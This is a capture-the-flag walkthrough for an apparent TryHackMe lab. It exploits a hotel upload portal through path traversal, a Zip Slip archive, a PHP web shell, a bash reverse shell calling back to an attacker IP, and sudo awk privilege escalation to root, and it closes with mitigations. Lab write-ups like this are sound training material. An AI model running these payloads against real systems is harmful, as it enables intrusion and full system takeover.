# Deep Dive Analysis — TryHackMe Hacker Holidays: Day 10 (The Hollow Shell)

## 📖 Introduction & Scenario Context
Day 10 introduces a highly tactical web application exploitation scenario focusing on **Arbitrary File Write via Path Traversal** and **Local File Inclusion (LFI)**. At the Byte Lotus Hotel Beach, a "Shoreline Display Portal" allows guests to personalize their room ambient systems by uploading compressed `.zip` souvenir media packs. 

However, the archive extraction utility fails to sanitize file path structures during decompression. This technical write-up documents the step-by-step process of auditing the upload behaviors, crafting a weaponized **Zip Slip** payload, overwriting local backend resources, and triggering an active remote shell connection to capture the flags.

---

## 🛠️ Step 1: Initial Reconnaissance & LFI Identification
We begin by identifying the web backend's structure and mapping out potential file paths to determine where our payload can be written or triggered.

1. **Target Inspection:** Open the target virtual machine IP address in your web browser to load the hotel's Shoreline Display Portal framework.
2. **Finding the Input Endpoint:** Locate the customization module where files are uploaded. Note that the application accepts `.zip` archives containing background assets.
3. **Discovering the Parameter Flaw:** Analyze how the portal displays uploaded contents. Observe a preview or theme selection page that loads layout templates dynamically via a query parameter:
   ```text
   http://<TARGET_IP>/display.php?page=welcome
   ```
4. **Testing for Local File Inclusion (LFI):** Intercept the request and attempt a basic path traversal payload sequence on the `page=` value block to check if the application renders arbitrary system logs or system files:
   ```text
   http://<TARGET_IP>/display.php?page=../../../../etc/passwd
   ```
5. **Confirming LFI:** If the server dumps the contents of the target system's `/etc/passwd` file directly onto the web interface screen, it confirms a severe Local File Inclusion flaw. We can use this to execute any PHP shell payload we drop onto the host filesystem.

---

## 🔍 Step 2: Constructing a Weaponized Zip Slip Exploit
Because the portal handles backend archive extraction carelessly, we can craft an archive file containing path traversal escape characters (`../`). When the server unzips it, the operating system will write our file outside the intended upload boundary and directly into a known web-accessible directory.

1. **Creating the Web Shell locally:** On your local terminal, create a lightweight PHP reverse shell code block named `shell.php` that will execute terminal strings:
   ```bash
   echo '<?php system(\$_GET["cmd"]); ?>' > shell.php
   ```
2. **Building the Traversal Path Wrapper:** Since standard archiving utilities automatically strip traversal dots out of filenames for security, we use a simple Python script to manually forge a malicious file path structure inside a raw ZIP archive stream.

Execute the following inline Python sequence to construct your custom Zip Slip file:
```bash
python3 -c '
import zipfile
z = zipfile.ZipFile("exploit.zip", "w")
# We use path traversal sequences to force extraction directly into the web root folder
z.write("shell.php", "../../../../var/www/html/shell.php")
z.close()
'
```
3. **Verifying the Archive Contents:** Check the internal file mapping metadata of your newly generated archive package to confirm that the raw directory traversal layers are preserved accurately:
   ```bash
   unzip -l exploit.zip
   ```
   *Expected Output structure:* `../../../../var/www/html/shell.php`

---

## 🚀 Step 3: Triggering File Upload & Remote Code Execution (RCE)
With the exploit payload fully staged, we upload it to the vulnerable hotel portal to overwrite our targeted filesystem directory blocks.

1. **Uploading the Payload:** Go to the web application interface, select the **Upload Souvenir Pack** button, choose your newly created `exploit.zip` file, and submit the web form.
2. **Verifying Arbitrary Write Success:** Use a terminal command or a new browser window tab to see if your web shell code script can be reached directly via the server's root URL:
   ```bash
   curl -X GET "http://<TARGET_IP>/shell.php?cmd=id"
   ```
   *Expected Return:* If successful, the server executes the injected binary command and prints the current low-privilege user ID details (e.g., `uid=33(www-data) gid=33(www-data) groups=33(www-data)`).

3. **Staging the Reverse Shell Connection:** Set up a live `netcat` connection framework handler on your attack console machine to intercept incoming network socket links:
   ```bash
   nc -lvnp 4444
   ```
4. **Spawning the Shell:** Execute a URL-encoded terminal command sequence string through your active web proxy backdoor path to trigger an interactive bash reverse terminal:
   ```bash
   curl -G "http://<TARGET_IP>/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<YOUR_ATTACKBOX_IP>/4444 0>&1'"
   ```
5. **Stabilizing the Shell Access:** Once the reverse connection initializes on your handler terminal window, spawn a fully responsive interactive shell context environment:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
6. **User Flag Extraction:** Navigate to the user profile directories to find and extract the initial level target flag asset string:
   ```bash
   cat /home/user/user.txt
   ```

---

## 👑 Step 4: Privilege Escalation to Root
With basic user environment level visibility secured, we check for internal configuration flaws or process privileges to obtain full system administrative root control.

1. **Auditing Sudo Permissions:** Query the system capabilities layout to verify if the low-privilege user account is permitted to run specific binaries with elevated binary rights:
   ```bash
   sudo -l
   ```
2. **Identifying the Vector:** Note if a system utility tool or binary script environment (such as `/usr/bin/find`, `/usr/bin/awk`, or an automation tool runtime script) can be invoked as root without prompting for a user password (`NOPASSWD:`).
3. **Abusing the Binary via GTFOBins:** Run an execution string wrapper matched to the uncovered binary tool to force the host utility to drop directly into a root shell. *(For example, if `awk` is permitted via sudo privileges)*:
   ```bash
   sudo awk 'BEGIN {system("/bin/sh")}'
   ```
4. **Administrative Verification:** Confirm that your user role tracking has successfully elevated up to the global administrative tier:
   ```bash
   whoami
   ```
   *Expected Return:* `root`
5. **Final Root Flag Capture:** Navigate directly into the root home directory node path to extract the final validation objective flag string resource:
   ```bash
   cd /root
   cat root.txt
   ```

---

## 🏁 Flag Captures
To explicitly maintain strict compliance with TryHackMe's anti-cheating, solution-protection, and deployment guidelines, literal flag outputs are completely hidden below:

* **User Flag:** `THM{REDACTED_ZIP_SLIP_TRAVERSAL_EXPLOITED}`
* **Root Flag:** `THM{REDACTED_PRIVILEGE_ESCALATION_SUCCESS}`

---

## 🛡️ Strategic Mitigation Actions
* **Sanitize Archive Entry Destinations:** Ensure that file decompression implementations explicitly resolve and check file target structures before writing them to the disk. Always strip out leading `../` traversal layers from entry filenames using methods like `Path.getCanonicalPath()` or equivalents to keep extracted files securely inside the target folder boundary.
* **Lock Down User Execution Folders:** Configure the server filesystem permissions so that the directories where files are uploaded (`/var/www/html/uploads/`) do not have script execution permissions (`noexec`). This ensures that even if a user uploads a malicious PHP web shell, the server engine will refuse to compile and run it.
* **Enforce Least Privilege Sudo Configurations:** Audit system `/etc/sudoers` rules frequently. Avoid mapping arbitrary binaries to `NOPASSWD:` access strings if those utilities have built-in options to run shell commands or execute code, preventing local user privilege escalation vectors.
